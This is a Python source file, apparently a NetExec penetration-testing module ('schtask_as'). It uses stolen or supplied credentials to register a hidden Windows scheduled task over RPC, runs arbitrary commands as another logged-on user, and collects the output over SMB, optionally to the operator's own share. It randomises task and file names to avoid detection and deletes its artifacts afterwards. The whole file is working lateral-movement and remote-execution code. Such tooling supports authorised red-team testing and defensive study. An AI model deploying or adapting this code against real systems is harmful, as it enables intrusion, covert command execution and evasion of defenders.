import contextlib
import os
from time import sleep
from datetime import datetime, timedelta
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport
from nxc.helpers.misc import gen_random_string
from nxc.paths import TMP_PATH
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


class NXCModule:
    """
    Execute a scheduled task remotely as a already connected user by @Defte_
    Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
    """

    def options(self, context, module_options):
        r"""
        CMD            Command to execute
        USER           User to execute command as
        TASK           OPTIONAL: Set a name for the scheduled task name
        FILE           OPTIONAL: Set a name for the command output file
        LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\')
        """
        self.cmd = self.user = self.task = self.file = self.location = self.time = None
        if "CMD" in module_options:
            self.cmd = module_options["CMD"]

        if "USER" in module_options:
            self.user = module_options["USER"]

        if "TASK" in module_options:
            self.task = module_options["TASK"]

        if "FILE" in module_options:
            self.file = module_options["FILE"]

        if "LOCATION" in module_options:
            self.location = module_options["LOCATION"]

    name = "schtask_as"
    description = "Remotely execute a scheduled task as a logged on user"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def on_admin_login(self, context, connection):
        self.logger = context.log
        if self.cmd is None:
            self.logger.fail("You need to specify a CMD to run")
            return 1
        if self.user is None:
            self.logger.fail("You need to specify a USER to run the command as")
            return 1

        self.logger.display("Connecting to the remote Service control endpoint")
        try:
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                self.user,
                self.cmd,
                self.file,
                self.task,
                self.location,
                connection.kerberos,
                connection.aesKey,
                connection.host,
                connection.kdcHost,
                connection.hash,
                self.logger,
                connection.args.get_output_tries,
                "C$",  # This one shouldn't be hardcoded but I don't know where to retrieve the info
            )

            self.logger.display(f"Executing {self.cmd} as {self.user}")
            output = exec_method.execute(self.cmd, True)

            try:
                if not isinstance(output, str):
                    output = output.decode(connection.args.codec)
            except UnicodeDecodeError:
                # Required to decode specific French characters otherwise it'll print b"<result>"
                output = output.decode("cp437")
            if output:
                self.logger.highlight(output)

        except Exception as e:
            if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
                self.logger.fail("Task was not run, seems like the specified user has no active session on the target")
                with contextlib.suppress(Exception):
                    exec_method.deleteartifact()
            else:
                self.logger.fail(f"Failed to execute command: {e}")


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, user, cmd, file, task, location, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger
        self.cmd = cmd
        self.user = user
        self.file = file
        self.task = task
        self.location = location

        if hashes is not None:
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = f"ncacn_np:{self.__target}[\\pipe\\atsvc]"
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def deleteartifact(self):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        self.logger.display(f"Deleting task \\{self.task}")
        tsch.hSchRpcDelete(dce, f"\\{self.task}")
        dce.disconnect()

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_end_boundary(self):
        # Get current date and time + 5 minutes
        end_boundary = datetime.now() + timedelta(minutes=5)

        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]

    def gen_xml(self, command, fileless=False):
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <RegistrationTrigger>
      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>{self.user}</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            fileLocation = "\\Windows\\Temp\\" if self.location is None else self.location
            if self.file is None:
                self.__output_filename = os.path.join(fileLocation, gen_random_string(6))
            else:
                self.__output_filename = os.path.join(fileLocation, self.file)
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>/C {command}</Arguments>"

        self.logger.debug(f"Generated argument XML: {argument_xml}")
        xml += argument_xml
        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()

        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        # Give self.task a random string as name if not already specified
        self.task = gen_random_string(8) if self.task is None else self.task
        xml = self.gen_xml(command, fileless)

        self.logger.info(f"Task XML: {xml}")
        self.logger.info(f"Creating task \\{self.task}")
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{self.task}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if "ERROR_NONE_MAPPED" in str(e):
                self.logger.fail(f"User {self.user} is not connected on the target, cannot run the task")
                with contextlib.suppress(Exception):
                    tsch.hSchRpcDelete(dce, f"\\{self.task}")
            elif e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("Create schedule task got blocked.")
                with contextlib.suppress(Exception):
                    tsch.hSchRpcDelete(dce, f"\\{self.task}")
            elif "ERROR_TRUSTED_DOMAIN_FAILURE" in str(e):
                self.logger.fail(f"User {self.user} does not exist in the domain.")
                with contextlib.suppress(Exception):
                    tsch.hSchRpcDelete(dce, f"\\{self.task}")
            elif "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
                with contextlib.suppress(Exception):
                    tsch.hSchRpcDelete(dce, f"\\{self.task}")
            elif "ERROR_ALREADY_EXISTS" in str(e):
                self.logger.fail(f"Create schedule task failed: {e}")
            else:
                self.logger.fail(f"Create schedule task failed: {e}")
                with contextlib.suppress(Exception):
                    tsch.hSchRpcDelete(dce, f"\\{self.task}")
            return

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{self.task}")
            resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{self.task}")
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{self.task}")
        tsch.hSchRpcDelete(dce, f"\\{self.task}")

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join(TMP_PATH, self.__output_filename)) as output:
                            self.output_callback(output.read())
                        break
                    except OSError:
                        sleep(2)
            else:
                smbConnection = self.__rpctransport.get_smb_connection()
                tries = 1
                while True:
                    try:
                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail("Schtask_as: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'.")
                            break
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"Schtask_as: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        if "SHARING" in str(e) or "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            sleep(3)
                            tries += 1
                        else:
                            self.logger.debug(str(e))

                if self.__outputBuffer:
                    self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                    smbConnection.deleteFile(self.__share, self.__output_filename)

        dce.disconnect()
